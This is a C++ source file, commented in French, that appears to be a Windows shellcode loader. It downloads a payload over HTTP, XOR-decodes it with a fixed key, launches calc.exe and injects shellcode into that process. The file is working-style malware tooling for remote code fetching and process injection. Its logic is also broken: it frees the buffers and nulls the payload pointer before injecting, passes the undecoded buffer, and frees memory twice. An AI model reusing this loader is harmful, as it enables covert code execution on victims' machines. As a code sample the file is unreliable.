#include <iostream> 
#include <stdio.h>
#include <Windows.h>


#include "http.h"
#include "decryptPayload.h"
#include "inject.h"


#include <tchar.h>


// Clé XOR utilisée pour le chiffrement
#define ENCRYPTION_KEY 0xAA

int main() {

    //Récupération du shellcode

    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "Erreur le shellcode n'est pas accessible " << std::endl;
        return 1;
    }

    std::cout << "Shellcode :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // Déchiffrement du payload
    UCHAR* decryptedPayload = (UCHAR*)LocalAlloc(LPTR, payloadSize);
    if (!decryptedPayload) {
        std::cerr << "Erreur d'allocation mémoire pour le déchiffrement." << std::endl;
        free(payload);
        return 1;
    }

    for (DWORD i = 0; i < payloadSize; i++) {
        decryptedPayload[i] = payload[i] ^ ENCRYPTION_KEY; // Déchiffrement avec la clé XOR
    }

    std::cout << "Payload déchiffré :" << std::endl;
    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", decryptedPayload[i]);
    }
    std::cout << std::endl;

    // Nettoyage
 if (decryptedPayload) {
     LocalFree(decryptedPayload);
     decryptedPayload = nullptr; // Eviter pointeurs
 }
 if (payload) {
     LocalFree(payload); // Libération de la mémoire allouée par getHTTPPayload
     payload = nullptr; // Eviter double libération

 }

 // Création d'un processus cible
 STARTUPINFO si;
 PROCESS_INFORMATION pi;
 ZeroMemory(&si, sizeof(si));
 si.cb = sizeof(si);
 ZeroMemory(&pi, sizeof(pi));
 const TCHAR* target = _T("c:\\WINDOWS\\system32\\calc.exe");

 if (!CreateProcess(
     target,
     NULL,
     NULL,            
     NULL,
     FALSE,           
     0,               
     NULL,            
     NULL,            
     &si,             
     &pi             
 )) {
     std::cerr << "CreateProcess échoué : erreur " << GetLastError() << std::endl;
     return 1;
 }

 DWORD targetPid = pi.dwProcessId;

 // Injection du shellcode dans le processus distant
 if (!injectShellcode(payload, payloadSize, targetPid)) {
     std::cerr << "Échec de l'injection dans le processus distant." << std::endl;
     LocalFree(payload);
     return 1;
 }

 std::cout << "Injection réussie dans le processus distant !" << std::endl;

 // Libérer la mémoire
 LocalFree(payload);



    return 0;
}
